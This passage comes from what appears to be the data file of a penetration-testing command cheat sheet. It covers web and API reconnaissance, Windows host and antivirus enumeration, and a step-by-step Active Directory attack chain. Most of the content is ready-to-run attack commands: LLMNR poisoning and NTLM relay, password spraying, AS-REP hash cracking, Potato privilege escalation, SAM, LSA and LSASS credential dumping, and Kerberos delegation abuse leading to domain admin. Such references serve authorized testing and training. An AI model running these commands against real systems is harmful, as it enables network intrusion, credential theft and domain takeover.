            { id: 'rweb-h7', label: 'HSTS check', os: 'Linux', command: 'curl -sI https://$$DOMAIN | grep -i "strict-transport"', notes: 'Strict-Transport-Security should include max-age ≥31536000 and ideally includeSubDomains.' },
            { id: 'rweb-h8', label: '403 bypass (path manipulation)', os: 'Linux', command: 'ffuf -u $$URL/FUZZ -w /dev/null -request-proto http -H "X-Original-URL: /admin" -mc 200,301,302', notes: 'Also try: /admin/, /.admin, /admin../, /admin%2f, and headers: X-Rewrite-URL, X-Forwarded-For: 127.0.0.1.' },
            ]
          }
        ],
      },
      {
        id: 'recon-api',
        name: 'API Discovery',
        description: 'Discover and probe REST, SOAP, and GraphQL APIs — endpoint enumeration, schema extraction, and vulnerability testing.',
        tags: ['api', 'rest', 'graphql', 'soap', 'web'],
        subtechniques: [
          {
            id: 'api-rest',
            name: 'REST API',
            commands: [
            { id: 'api1', label: 'Endpoint discovery (ffuf)', os: 'Linux', command: 'ffuf -u $$URL/FUZZ -w $$WORDLIST -mc 200,201,204,301,302,400,401,403,405 -t 50', notes: 'Include 4xx codes — REST APIs return 401/403 for valid-but-unauthenticated endpoints, and 400 for missing required params.' },
            { id: 'api2', label: 'API version prefix brute', os: 'Linux', command: 'ffuf -u $$URL/FUZZ/endpoint -w $$WORDLIST -mc 200,201,301,400,401,403', notes: 'Try v1/, v2/, api/, api/v1/. SecLists/Discovery/Web-Content/api/ has a useful wordlist.' },
            { id: 'api3', label: 'GET parameter fuzz', os: 'Linux', command: 'ffuf -u "$$URL/api/user?FUZZ=test" -w $$WORDLIST -mc 200,201,400,401', notes: 'Discover hidden GET parameters on a known API endpoint.' },
            { id: 'api4', label: 'Response header check', os: 'Linux', command: 'curl -I $$URL/api', notes: 'Look for X-Powered-By, API-Version, X-API-Version, and custom disclosure headers.' },
            ]
          },
          {
            id: 'api-soap',
            name: 'SOAP / WSDL',
            commands: [
            { id: 'api5', label: 'Fetch WSDL', os: 'Linux', command: 'curl -s "$$URL/service?wsdl"', notes: 'WSDL is your attack blueprint — lists all operations, parameters, data types, and request format. Equivalent to a full API spec.' },
            { id: 'api6', label: 'Brute WSDL paths', os: 'Linux', command: 'ffuf -u $$URL/FUZZ -w $$WORDLIST -mc 200 -e ?wsdl,.wsdl', notes: 'Common paths: /wsdl, /service.wsdl, /service?wsdl, /api.wsdl, /ws?wsdl.' },
            { id: 'api7', label: 'Send SOAP request', os: 'Linux', command: 'curl -X POST $$URL/service -H "Content-Type: text/xml" -d \'<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><GetUser><id>1</id></GetUser></soapenv:Body></soapenv:Envelope>\'', notes: 'Template — replace operation name and parameters from WSDL. Intercept via Burp for easier modification.' },
            { id: 'api8', label: 'IDOR via SOAP', os: 'Linux', command: 'curl -X POST $$URL/service -H "Content-Type: text/xml" -d \'<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><GetUser><id>2</id></GetUser></soapenv:Body></soapenv:Envelope>\'', notes: 'Increment id to test IDOR. Also try: <role>admin</role>, <isAdmin>true</isAdmin>, SQLi in field values.' },
            ]
          },
          {
            id: 'api-graphql',
            name: 'GraphQL',
            commands: [
            { id: 'api9', label: 'Endpoint discovery (ffuf)', os: 'Linux', command: 'ffuf -u $$URL/FUZZ -w $$WORDLIST -mc 200,400,405', notes: 'GraphQL often returns 400 for GET requests and 405 for wrong methods. Common paths: /graphql, /api/graphql, /v1/graphql, /graphiql, /playground.' },
            { id: 'api10', label: 'Confirm GraphQL endpoint', os: 'Linux', command: 'curl -X POST $$URL/graphql -H "Content-Type: application/json" -d \'{"query":"{__typename}"}\'', notes: 'Valid GraphQL returns {"data":{"__typename":"Query"}}. Any other response format means it\'s not GraphQL.' },
            { id: 'api11', label: 'Introspection (full schema)', os: 'Linux', command: 'curl -X POST $$URL/graphql -H "Content-Type: application/json" -d \'{"query":"{ __schema { types { name fields { name } } } }"}\'', notes: 'Dumps entire schema — all types, queries, mutations, and fields. If enabled in production, this is full recon in one request. Hunt for: admin, password, token, role, internal.' },
            { id: 'api12', label: 'Query unauthorized field', os: 'Linux', command: 'curl -X POST $$URL/graphql -H "Content-Type: application/json" -d \'{"query":"{ user(id: 1) { password role } }"}\'', notes: 'After mapping schema via introspection, test unauthorized field access. Increment id for IDOR testing.' },
            { id: 'api13', label: 'Check GraphiQL/Playground', os: 'Linux', command: 'curl -s $$URL/graphiql | grep -i graphql', notes: 'If accessible in production: interactive schema explorer with autocomplete — full recon without auth.' },
            ]
          }
        ],
      },
      {
        id: 'recon-passive',
        name: 'Passive Recon',
        description: 'Non-intrusive intelligence gathering: archived URLs, Shodan, screenshots, favicon fingerprinting, and Google dorking — zero direct interaction with the target.',
        tags: ['osint', 'passive', 'web', 'archive'],
        subtechniques: [
          {
            id: 'rpass-archive',
            name: 'URL & Archive Mining',
            commands: [
            { id: 'rpass1', label: 'Wayback Machine (all URLs)', os: 'Linux', command: 'curl -s "http://web.archive.org/cdx/search/cdx?url=$$DOMAIN/*&output=text&fl=original&collapse=urlkey" | sort -u', notes: 'CDX API — pulls every archived URL for the domain. No API key needed. Great starting point for endpoint discovery.' },
            { id: 'rpass2', label: 'waybackurls', os: 'Linux', command: 'echo $$DOMAIN | waybackurls | sort -u | tee wayback_urls.txt', notes: 'Streams archived URLs from Wayback Machine. Pipe to grep for interesting patterns: ?id=, ?file=, /admin.' },
            { id: 'rpass3', label: 'gau (all providers)', os: 'Linux', command: 'gau --providers wayback,otx,commoncrawl,urlscan $$DOMAIN | sort -u | tee gau_urls.txt', notes: 'Aggregates URLs from multiple public sources. More complete than waybackurls alone.' },
            { id: 'rpass4', label: 'gau filter endpoints', os: 'Linux', command: 'gau $$DOMAIN | grep "\\?" | sort -u', notes: 'Filter to only parameterized URLs — prime targets for injection and IDOR testing.' },
            { id: 'rpass5', label: 'hakrawler passive', os: 'Linux', command: 'echo $$URL | hakrawler -d 3 -subs', notes: 'Passive crawl using page JS, sitemaps, and robots.txt. Includes subdomains with -subs.' },
            { id: 'rpass6', label: 'katana passive', os: 'Linux', command: 'katana -u $$URL -passive -jc -o katana.txt', notes: '-passive uses web archive sources. -jc parses JavaScript for hidden endpoints.' },
            ]
          },
          {
            id: 'rpass-shodan',
            name: 'Shodan & Censys',
            commands: [
            { id: 'rpass7', label: 'Shodan host lookup', os: 'Both', command: 'shodan host $$IP', notes: 'Requires shodan CLI: pip install shodan && shodan init YOUR_API_KEY. Shows open ports, banners, CVEs, and geolocation.' },
            { id: 'rpass8', label: 'Shodan domain search', os: 'Both', command: 'shodan search "hostname:$$DOMAIN" --fields ip_str,port,org,product', notes: 'Find all Shodan-indexed IPs and services linked to a domain.' },
            { id: 'rpass9', label: 'Shodan SSL cert search', os: 'Both', command: 'shodan search "ssl.cert.subject.CN:$$DOMAIN" --fields ip_str,port,org', notes: 'Find all hosts with SSL certificates issued for the domain — often reveals hidden subdomains and VPNs.' },
            { id: 'rpass10', label: 'Favicon hash (Python)', os: 'Linux', command: 'python3 -c "import requests,mmh3,codecs; r=requests.get(\'$$URL/favicon.ico\'); h=mmh3.hash(codecs.lookup(\'base64\').encode(r.content)[0]); print(h)"', notes: 'Get the Shodan favicon hash. Then search Shodan: http.favicon.hash:<value> to find all servers running the same app.' },
            { id: 'rpass11', label: 'Censys IP lookup', os: 'Both', command: 'censys view $$IP', notes: 'Requires censys CLI: pip install censys && censys config. Full TLS, port, and protocol data.' },
            { id: 'rpass12', label: 'Censys domain search', os: 'Both', command: 'censys search "parsed.names: $$DOMAIN" --index-type certificates', notes: 'Find all certificates issued for the domain via Censys — reveals subdomains and IP ranges.' },
            ]
          },
          {
            id: 'rpass-google',
            name: 'Google Dorking',
            commands: [
            { id: 'rpass13', label: 'Site all pages', os: 'Both', command: 'site:$$DOMAIN', notes: 'Shows all Google-indexed pages. Add -www to exclude www and find subdomains.' },
            { id: 'rpass14', label: 'Find login panels', os: 'Both', command: 'site:$$DOMAIN inurl:login OR inurl:admin OR inurl:portal', notes: 'Discover authentication endpoints indexed by Google.' },
            { id: 'rpass15', label: 'Find exposed files', os: 'Both', command: 'site:$$DOMAIN ext:php OR ext:asp OR ext:aspx OR ext:jsp OR ext:env OR ext:sql', notes: 'Look for exposed source files, config files, and database dumps.' },
            { id: 'rpass16', label: 'Find subdomains', os: 'Both', command: 'site:*.$$DOMAIN -site:www.$$DOMAIN', notes: 'Find all indexed subdomains while excluding www. Combine with -site: to narrow scope.' },
            { id: 'rpass17', label: 'Exposed docs & backups', os: 'Both', command: 'site:$$DOMAIN ext:pdf OR ext:doc OR ext:docx OR ext:xls OR ext:xlsx OR ext:bak OR ext:zip', notes: 'Look for accidentally indexed documents, spreadsheets, and backup archives.' },
            { id: 'rpass18', label: 'Error pages (stack traces)', os: 'Both', command: 'site:$$DOMAIN intext:"sql syntax" OR intext:"warning: mysql" OR intext:"ORA-" OR intext:"stack trace"', notes: 'Find pages leaking error messages — reveals technologies, versions, and SQL context.' },
            { id: 'rpass19', label: 'Wayback snapshot (browser)', os: 'Both', command: 'https://web.archive.org/web/*/$$DOMAIN', notes: 'Paste in browser. Timeline view of all archived snapshots — check old app versions for exposed endpoints or removed content.' },
            ]
          },
          {
            id: 'rpass-screen',
            name: 'Screenshots & Visual Recon',
            commands: [
            { id: 'rpass20', label: 'gowitness single', os: 'Linux', command: 'gowitness single $$URL', notes: 'Screenshots a single URL. Output to ./screenshots/ by default.' },
            { id: 'rpass21', label: 'gowitness from file', os: 'Linux', command: 'gowitness file -f urls.txt --threads 10', notes: 'Screenshot all URLs in a file. Combine with gau/waybackurls output for mass recon.' },
            { id: 'rpass22', label: 'gowitness from nmap', os: 'Linux', command: 'gowitness nmap -f nmap_scan.xml --open-only --service-contains http', notes: 'Feed nmap XML output directly — screenshots all detected HTTP services.' },
            { id: 'rpass23', label: 'EyeWitness', os: 'Linux', command: 'python3 EyeWitness.py -f urls.txt --web --timeout 10 -d eyewitness_out/', notes: 'Screenshots + fingerprinting + categorization. Generates HTML report. Good for large scope assessments.' },
            { id: 'rpass24', label: 'aquatone from urls', os: 'Linux', command: 'cat urls.txt | aquatone -out aquatone_out/', notes: 'Mass screenshot tool with clustering by similarity. Feed domain list from subfinder, amass, or gau.' },
            ]
          }
        ],
      },
    ],
  },

  /* ── 2. Basic Enumeration (Windows) ─────────────────────────────────────── */
  {
    id: 'basic-enum',
    name: 'Basic Enumeration',
    icon: '📋',
    techniques: [
      {
        id: 'be-general',
        name: 'General Windows Enumeration',
        description: 'Gather basic host info: OS, users, processes, installed software.',
        tags: ['windows', 'enumeration', 'post-exploit'],
                subtechniques: [
          {
            id: "beg-sys",
            name: "System & Processes",
            commands: [
            { id: "beg1", label: "System info", os: "Windows", command: "systeminfo", notes: "OS version, hotfixes, domain name." },
            { id: "beg2", label: "Whoami + privs", os: "Windows", command: "whoami /all", notes: "Current user, groups, and privileges." },
            { id: "beg3", label: "Running processes", os: "Windows", command: "tasklist /v", notes: "Verbose process list with owner." },
            { id: "beg4", label: "WMIC computer info", os: "Windows", command: "wmic computersystem get Name,Domain,Manufacturer,Model,Username", notes: "" }
            ]
          },
          {
            id: "beg-usr",
            name: "Users, Software & Tasks",
            commands: [
            { id: "beg5", label: "Local users", os: "Windows", command: "net user", notes: "List all local user accounts." },
            { id: "beg6", label: "Local admins", os: "Windows", command: "net localgroup administrators", notes: "" },
            { id: "beg7", label: "Installed software", os: "Windows", command: "wmic product get Name,Version", notes: "May be slow on large systems." },
            { id: "beg8", label: "Scheduled tasks", os: "Windows", command: "schtasks /query /fo LIST /v", notes: "Look for tasks running as SYSTEM." }
            ]
          }
        ],
      },
      {
        id: 'be-network',
        name: 'Network Enumeration',
        description: 'Discover network config, open ports, routing, and ARP cache.',
        tags: ['windows', 'network', 'enumeration'],
                subtechniques: [
          {
            id: "ben-int",
            name: "Interface & Routing",
            commands: [
            { id: "ben1", label: "IP configuration", os: "Windows", command: "ipconfig /all", notes: "All adapters, DNS servers, DHCP." },
            { id: "ben2", label: "ARP cache", os: "Windows", command: "arp -a", notes: "Hosts recently communicated with — pivot targets." },
            { id: "ben3", label: "Routing table", os: "Windows", command: "route print", notes: "Useful for discovering internal subnets." }
            ]
          },
          {
            id: "ben-conn",
            name: "Connections & Firewall",
            commands: [
            { id: "ben4", label: "Open connections", os: "Windows", command: "netstat -ano", notes: "Active connections with PIDs." },
            { id: "ben5", label: "Firewall rules", os: "Windows", command: "netsh advfirewall show allprofiles", notes: "Is firewall on? What rules exist?" },
            { id: "ben6", label: "DNS cache", os: "Windows", command: "ipconfig /displaydns", notes: "Reveals recently resolved hostnames." }
            ]
          }
        ],
      },
      {
        id: 'be-protection',
        name: 'AV / Protection Enumeration',
        description: 'Identify Defender, AMSI, AppLocker, and EDR presence before running tools.',
        tags: ['windows', 'av', 'amsi', 'applocker', 'evasion'],
                subtechniques: [
          {
            id: "bep-av",
            name: "AV & AMSI",
            commands: [
            { id: "bep1", label: "Defender status", os: "Windows", command: "Get-MpComputerStatus", notes: "Shows if real-time protection is enabled." },
            { id: "bep2", label: "Defender exclusions", os: "Windows", command: "Get-MpPreference | Select-Object ExclusionPath, ExclusionProcess", notes: "Safe drop zones for tools." },
            { id: "bep3", label: "AMSI providers", os: "Windows", command: "reg query HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers", notes: "What AMSI providers are registered?" }
            ]
          },
          {
            id: "bep-al",
            name: "AppLocker & Logging",
            commands: [
            { id: "bep4", label: "AppLocker policy", os: "Windows", command: "Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections", notes: "Shows effective AppLocker rules." },
            { id: "bep5", label: "AppLocker (wmic)", os: "Windows", command: "wmic /namespace:\\root\\Microsoft\\Security\\ApplicationID\\Policy path PathRule get RuleId,Name,Action", notes: "Alternative AppLocker query." },
            { id: "bep6", label: "Running AV products", os: "Windows", command: "wmic /namespace:\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState", notes: "Lists registered AV products." },
            { id: "bep7", label: "PowerShell logging", os: "Windows", command: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell", notes: "Check if ScriptBlockLogging is enabled." }
            ]
          }
        ],
      },
    ],
  },

  /* ── Active Directory (Full Methodology) ─────────────────────────────── */
  {
    id: 'active-directory',
    name: 'Active Directory',
    icon: '🏰',
    techniques: [
      {
        id: 'ad-recon',
        name: 'Recon (No Creds)',
        description: 'Map the domain without credentials. Goal: identify the domain, find valid usernames, grab one credential or hash. Exit when you hold user:password or user:hash.',
        tags: ['active-directory', 'recon', 'kerberos'],
                subtechniques: [
          {
            id: "adr-disc",
            name: "No-Auth Discovery",
            commands: [
            { id: "adr1", label: "Port scan DC", os: "Linux", command: "nmap -p 53,88,135,139,389,445,464,636,3268,3269,5985,3389 -sV -sC $$DC", notes: "Port 88 (Kerberos) + 389 (LDAP) + 445 (SMB) confirms you are looking at a Domain Controller." },
            { id: "adr2", label: "SMB banner (null session)", os: "Linux", command: "nxc smb $$DC -u '' -p ''", notes: "Reveals domain name, hostname, OS version without credentials." },
            { id: "adr3", label: "SMB banner (guest)", os: "Linux", command: "nxc smb $$DC -u 'guest' -p ''", notes: "Try guest session — sometimes returns more info than null." },
            { id: "adr4", label: "LDAP base query (no creds)", os: "Linux", command: "ldapsearch -x -H ldap://$$DC -s base namingcontexts", notes: "Returns DC=corp,DC=local — confirms domain naming context without creds." },
            { id: "adr5", label: "RPC domain info (null)", os: "Linux", command: "rpcclient -U \"\" -N $$DC -c \"querydominfo\"", notes: "Pull domain name and basic info without credentials." }
            ]
          },
          {
            id: "adr-enum",
            name: "Username & Hash Gathering",
            commands: [
            { id: "adr6", label: "Username enumeration (Kerbrute)", os: "Linux", command: "kerbrute userenum -d $$DOMAIN --dc $$DC $$WORDLIST", notes: "No lockout risk — validates usernames via Kerberos port 88 only." },
            { id: "adr7", label: "RID brute (guest/null)", os: "Linux", command: "nxc smb $$DC -u guest -p '' --rid-brute", notes: "Enumerate users via RID cycling — works on many default configurations." },
            { id: "adr8", label: "AS-REP roast (no creds)", os: "Linux", command: "impacket-GetNPUsers $$DOMAIN/ -usersfile users.txt -no-pass -dc-ip $$DC -format hashcat", notes: "Accounts with pre-auth disabled return crackable AS-REP hashes — no credential needed." },
            { id: "adr9", label: "Crack AS-REP hash", os: "Linux", command: "hashcat -m 18200 asrep.hash $$WORDLIST", notes: "Mode 18200 = Kerberos AS-REP. Start with rockyou, then targeted rules." }
            ]
          }
        ],
      },
      {
        id: 'ad-relay',
        name: 'LLMNR Poisoning & Relay',
        description: 'Capture NTLMv2 hashes via broadcast poisoning and relay them to gain access without cracking. Works pre-creds on the local subnet.',
        tags: ['active-directory', 'relay', 'credentials', 'llmnr'],
        subtechniques: [
          {
            id: 'adrl-poison',
            name: 'LLMNR / NBT-NS Poisoning',
            commands: [
              { id: 'adrl1', label: 'Responder (capture hashes)', os: 'Linux', command: 'sudo responder -I $$IFACE -wPv', notes: 'Poisons LLMNR/NBT-NS/MDNS on the subnet. Captured NTLMv2 hashes saved to /usr/share/responder/logs/. Stop before running relay.' },
              { id: 'adrl2', label: 'Check LLMNR / NBT-NS scope', os: 'Linux', command: 'sudo responder -I $$IFACE --analyze', notes: 'Passive mode — only analyse, no poisoning. Good for recon before deciding to go active.' },
              { id: 'adrl3', label: 'Crack captured NTLMv2 hash', os: 'Linux', command: 'hashcat -m 5600 ntlmv2.hash $$WORDLIST', notes: 'Mode 5600 = NTLMv2. Use rockyou first, then targeted rules. Hash file is in Responder logs directory.' },
            ],
          },
          {
            id: 'adrl-relay',
            name: 'NTLM Relay (ntlmrelayx)',
            commands: [
              { id: 'adrl4', label: 'Find hosts without SMB signing', os: 'Linux', command: 'nxc smb $$IP/24 --gen-relay-list targets.txt', notes: 'Only hosts with SMB signing disabled are relayable. This generates the targets file for ntlmrelayx.' },
              { id: 'adrl5', label: 'Relay to SAM dump', os: 'Linux', command: 'sudo impacket-ntlmrelayx -tf targets.txt -smb2support', notes: 'Run alongside Responder (with SMB/HTTP off in Responder.conf). Relays incoming auth to targets and dumps SAM hashes.' },
              { id: 'adrl6', label: 'Relay with interactive shell', os: 'Linux', command: 'sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i', notes: 'Opens a local SMB shell (-i). Connect with nc 127.0.0.1 11000 after a relay succeeds.' },
              { id: 'adrl7', label: 'Relay to LDAP (add DA)', os: 'Linux', command: 'sudo impacket-ntlmrelayx -t ldaps://$$DC --delegate-access --escalate-user $$USER', notes: 'Relay to LDAPS to abuse Resource-Based Constrained Delegation. Requires domain controller as target and a machine account.' },
            ],
          },
          {
            id: 'adrl-ipv6',
            name: 'IPv6 DNS Takeover (mitm6)',
            commands: [
              { id: 'adrl8', label: 'mitm6 DNS takeover', os: 'Linux', command: 'sudo mitm6 -d $$DOMAIN', notes: 'Advertises a rogue IPv6 DNS server. Windows prefers IPv6 — clients will send auth to your machine. Run alongside ntlmrelayx.' },
              { id: 'adrl9', label: 'Relay IPv6 auth to LDAPS', os: 'Linux', command: 'sudo impacket-ntlmrelayx -6 -t ldaps://$$DC -wh fakewpad.$$DOMAIN -l loot', notes: 'Combines mitm6 relay with LDAPS target. Dumps domain info to ./loot/ directory. High value — often gets DA delegation.' },
            ],
          },
        ],
      },
      {
        id: 'ad-domain-enum',
        name: 'Domain Enumeration',
        description: 'Broad recon pass after getting first credential. Map the shape of the domain — users, groups, shares, GPP, BloodHound. Run BloodHound immediately.',
        tags: ['active-directory', 'enumeration', 'bloodhound'],
                subtechniques: [
          {
            id: "adde-val",
            name: "Access Validation",
            commands: [
            { id: "adde1", label: "Validate credential", os: "Linux", command: "nxc smb $$DC -u $$USER -p $$PASSWORD", notes: "Confirms cred is valid. \"Pwn3d!\" = local admin on that host." },
            { id: "adde2", label: "Sweep subnet for local admin", os: "Linux", command: "nxc smb $$IP/24 -u $$USER -p $$PASSWORD", notes: "Where does this credential grant local admin? \"Pwn3d!\" marks each hit." },
            { id: "adde3", label: "Check WinRM access", os: "Linux", command: "nxc winrm $$DC -u $$USER -p $$PASSWORD", notes: "\"Pwn3d!\" = you can get a shell via evil-winrm on port 5985." }
            ]
          },
          {
            id: "adde-bh",
            name: "BloodHound Collection",
            commands: [
            { id: "adde4", label: "BloodHound collection (Linux)", os: "Linux", command: "bloodhound-python -u $$USER -p $$PASSWORD -ns $$DC -d $$DOMAIN -c All --zip", notes: "Mark your user Owned first. Key queries: Shortest Path to DA, DCSync rights, GenericAll/WriteDACL edges." },
            { id: "adde5", label: "BloodHound collection (Windows)", os: "Windows", command: "SharpHound.exe -c All", notes: "Run from a domain-joined host. Upload the zip to BloodHound." }
            ]
          },
          {
            id: "adde-obj",
            name: "Domain Object Enum",
            commands: [
            { id: "adde6", label: "List users + descriptions", os: "Linux", command: "nxc smb $$DC -u $$USER -p $$PASSWORD --users", notes: "Description fields often contain passwords — read every single one." },
            { id: "adde7", label: "List groups", os: "Linux", command: "nxc smb $$DC -u $$USER -p $$PASSWORD --groups", notes: "Look for custom admin groups, helpdesk, IT groups — these are BloodHound edges." },
            { id: "adde8", label: "Check password policy", os: "Linux", command: "nxc smb $$DC -u $$USER -p $$PASSWORD --pass-pol", notes: "Get lockout threshold BEFORE spraying — know exactly how many attempts you have." }
            ]
          },
          {
            id: "adde-misc",
            name: "Shares, GPP & Spraying",
            commands: [
            { id: "adde9", label: "Enumerate shares (subnet)", os: "Linux", command: "nxc smb $$IP/24 -u $$USER -p $$PASSWORD --shares", notes: "Look for non-standard shares beyond NETLOGON/SYSVOL/C$/ADMIN$." },
            { id: "adde10", label: "Spider shares for secrets", os: "Linux", command: "nxc smb $$IP/24 -u $$USER -p $$PASSWORD -M spider_plus", notes: "Crawls shares for sensitive files. Check .xml, .ini, .config, .ps1, .bat, .txt." },
            { id: "adde11", label: "GPP passwords in SYSVOL", os: "Linux", command: "nxc smb $$DC -u $$USER -p $$PASSWORD -M gpp_password", notes: "Group Policy Preferences cpassword is AES-encrypted with a public key — always check." },
            { id: "adde12", label: "Password spray", os: "Linux", command: "nxc smb $$DC -u users.txt -p 'Welcome2024!' --continue-on-success", notes: "Check lockout policy first! Candidates: Season+Year, CompanyName1, Welcome1, Password1." },
            { id: "adde13", label: "Kerberoast discovery", os: "Linux", command: "impacket-GetUserSPNs $$DOMAIN/$$USER:$$PASSWORD -dc-ip $$DC", notes: "List SPN accounts before requesting hashes. Check group memberships in BloodHound first." }
            ]
          }
        ],
      },
      {
        id: 'ad-local-privesc',
        name: 'Local Privilege Escalation',
        description: 'Escalate from low-priv shell to SYSTEM/local admin. Required before credential harvesting can feed the loop.',
        tags: ['active-directory', 'privesc', 'windows'],
                subtechniques: [
          {
            id: "adlp-enum",
            name: "System Enumeration",
            commands: [
            { id: "adlp1", label: "Check token privileges", os: "Windows", command: "whoami /priv", notes: "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege = Potato attack path." },
            { id: "adlp2", label: "winPEAS automated enum", os: "Windows", command: ".winPEASany.exe", notes: "Comprehensive local privesc check. Read highlighted results — unquoted paths, weak service perms, stored creds." },
            { id: "adlp3", label: "PowerUp checks", os: "Windows", command: ". .PowerUp.ps1; Invoke-AllChecks", notes: "Service misconfigs, AlwaysInstallElevated, unquoted paths, registry autoruns, stored creds." }
            ]
          },
          {
            id: "adlp-se",
            name: "SeImpersonate Exploits",
            commands: [
            { id: "adlp4", label: "GodPotato (SeImpersonate)", os: "Windows", command: ".GodPotato.exe -cmd \"net localgroup administrators $$USER /add\"", notes: "SeImpersonatePrivilege on modern Windows/Server 2022. Spawns SYSTEM-level command." },
            { id: "adlp5", label: "PrintSpoofer (SeImpersonate)", os: "Windows", command: ".PrintSpoofer.exe -i -c cmd", notes: "SeImpersonatePrivilege on Server 2019 / Win10. Spawns interactive SYSTEM shell." }
            ]
          },
          {
            id: "adlp-cred",
            name: "Credential Harvesting",
            commands: [
            { id: "adlp6", label: "Dump SAM (after local admin)", os: "Linux", command: "nxc smb $$TARGET_HOST -u $$USER -p $$PASSWORD --sam", notes: "Local account hashes. Check for password reuse — especially built-in Administrator." },
            { id: "adlp7", label: "Dump LSA secrets", os: "Linux", command: "nxc smb $$TARGET_HOST -u $$USER -p $$PASSWORD --lsa", notes: "LSA secrets include cached domain creds, service account passwords, DPAPI secrets." },
            { id: "adlp8", label: "Dump LSASS (lsassy)", os: "Linux", command: "nxc smb $$TARGET_HOST -u $$USER -H $$HASH -M lsassy", notes: "Credentials of all users with active sessions — high value if a DA is logged in." }
            ]
          }
        ],
      },
      {
        id: 'ad-admin-recon',
        name: 'Admin Recon & Session Hunting',
        description: 'Targeted pass from your current vantage — repeated every time you land on a new host. Find where Domain Admin sessions are active right now.',
        tags: ['active-directory', 'enumeration', 'lateral-movement'],
        commands: [
          { id: 'adar1', label: 'Find DA logged-on sessions', os: 'Linux', command: 'nxc smb $$IP/24 -u $$USER -H $$HASH --loggedon-users', notes: 'Sweep subnet for hosts where a DA is currently logged on. That host is your next target.' },
          { id: 'adar2', label: 'Find where hash is local admin', os: 'Linux', command: 'nxc smb $$IP/24 -u $$USER -H $$HASH --continue-on-success', notes: '"Pwn3d!" = local admin. Each new host is a new credential source — dump them all.' },
          { id: 'adar3', label: 'Re-run BloodHound (new vantage)', os: 'Linux', command: 'bloodhound-python -u $$USER -H $$HASH -ns $$DC -d $$DOMAIN -c All --zip', notes: 'Mark new hosts/users as Owned. Re-query shortest path to DA from your current position.' },
          { id: 'adar4', label: 'Find unconstrained delegation', os: 'Linux', command: 'nxc ldap $$DC -u $$USER -p $$PASSWORD --trusted-for-delegation', notes: 'Unconstrained delegation computers capture TGTs — coerce via PetitPotam/PrinterBug to steal DA TGT.' },
        ],
      },
      {
        id: 'ad-domain-privesc',
        name: 'Domain Privilege Escalation',
        description: 'Abuse Kerberos delegation misconfigs to impersonate privileged users. Three attack paths: Unconstrained (KUD), Constrained (KCD), and Resource-Based Constrained Delegation (RBCD).',
        tags: ['active-directory', 'kerberos', 'delegation', 'privesc'],
        subtechniques: [
          {
            id: 'kud',
            name: 'Unconstrained Delegation (KUD)',
            commands: [
              { id: 'adp1', label: 'Find unconstrained delegation hosts', os: 'Linux', command: 'nxc ldap $$DC -u $$USER -p $$PASSWORD --trusted-for-delegation', notes: 'Computers with unconstrained delegation cache TGTs of every connecting user. Protected Users members are excluded — but native RID 500 Admin is NOT protected.' },
              { id: 'adp3', label: 'Step 1 — add attacker SPN', os: 'Linux', command: 'addspn.py -u "$$DOMAIN\\\\$$USER" -p "$$HASH" --target $$TARGET_HOST --spn HOST/$$LHOST.$$DOMAIN --additional $$DC', notes: 'Register your listener hostname as an SPN on the compromised unconstrained account so Kerberos tickets route to you.' },
              { id: 'adp4', label: 'Step 2 — add DNS entry', os: 'Linux', command: 'dnstool.py -u "$$DOMAIN\\\\$$USER" -p "$$HASH" -r $$LHOST.$$DOMAIN -d $$LHOST --action add $$DC', notes: 'Creates a DNS A record pointing your attacker hostname to your IP — required so the victim can resolve and connect.' },
              { id: 'adp5', label: 'Step 3 — start listener (user account, RC4)', os: 'Linux', command: 'krbrelayx.py --krbsalt $$DOMAIN$$USER --krbpass $$PASSWORD', notes: 'User accounts use RC4. Salt format: DOMAINusername (uppercase domain, case-sensitive username). Decrypts and dumps captured TGTs.' },
              { id: 'adp6', label: 'Step 3 — start listener (computer account, AES256)', os: 'Linux', command: 'krbrelayx.py --aesKey <aes256_key>', notes: 'Computer accounts use AES256. Extract the AES key from secretsdump output. Run before triggering coercion.' },
              { id: 'adp7', label: 'Step 4 — coerce DC authentication', os: 'Linux', command: 'coercer coerce --always-continue -u $$USER -p $$PASSWORD -d $$DOMAIN -t $$DC -l $$LHOST.$$DOMAIN', notes: 'Tries all coercion vectors (MS-RPRN, MS-EFSR, MS-FSRVP) automatically. krbrelayx captures and decrypts the incoming TGT.' },
              { id: 'adp8', label: 'Use captured TGT', os: 'Linux', command: 'export KRB5CCNAME=<captured>.ccache && impacket-psexec -k -no-pass $$DOMAIN/$$USER@$$DC.$$DOMAIN', notes: 'krbrelayx saves captured TGTs as .ccache files. Use FQDN not IP.' },
            ],
          },
          {
            id: 'kcd',
            name: 'Constrained Delegation (KCD)',
            commands: [
              { id: 'adp2', label: 'Find all delegation accounts', os: 'Linux', command: 'impacket-findDelegation $$DOMAIN/$$USER:$$PASSWORD -dc-ip $$DC', notes: 'Lists all accounts with delegation configured. Check "Delegation Type": Unconstrained / Constrained / RBCD and the "Delegation To" SPN.' },
              { id: 'adp9', label: 'Abuse via S4U2Self + S4U2Proxy', os: 'Linux', command: 'impacket-getST -spn cifs/$$DC.$$DOMAIN -impersonate Administrator -dc-ip $$DC $$DOMAIN/$$USER:$$PASSWORD', notes: 'Gets a service ticket as Administrator for the configured SPN. The compromised account must have constrained delegation to that SPN.' },
            ],
          },
          {
            id: 'rbcd',
            name: 'Resource-Based Constrained Delegation (RBCD)',
            commands: [
              { id: 'adp10', label: 'Step 1 — create attacker computer account', os: 'Linux', command: 'impacket-addcomputer $$DOMAIN/$$USER:$$PASSWORD -computer-name EVIL$ -computer-pass Evil123 -dc-ip $$DC', notes: 'MachineAccountQuota must be > 0 (default 10). Requires any domain user. Creates a computer account you fully control.' },
              { id: 'adp11', label: 'Step 2 — configure delegation on target', os: 'Linux', command: 'impacket-rbcd -delegate-from EVIL$ -delegate-to $$TARGET_HOST$ -action write $$DOMAIN/$$USER:$$PASSWORD', notes: 'Requires GenericWrite/GenericAll on the target computer. Writes EVIL$ into msDS-AllowedToActOnBehalfOfOtherIdentity.' },
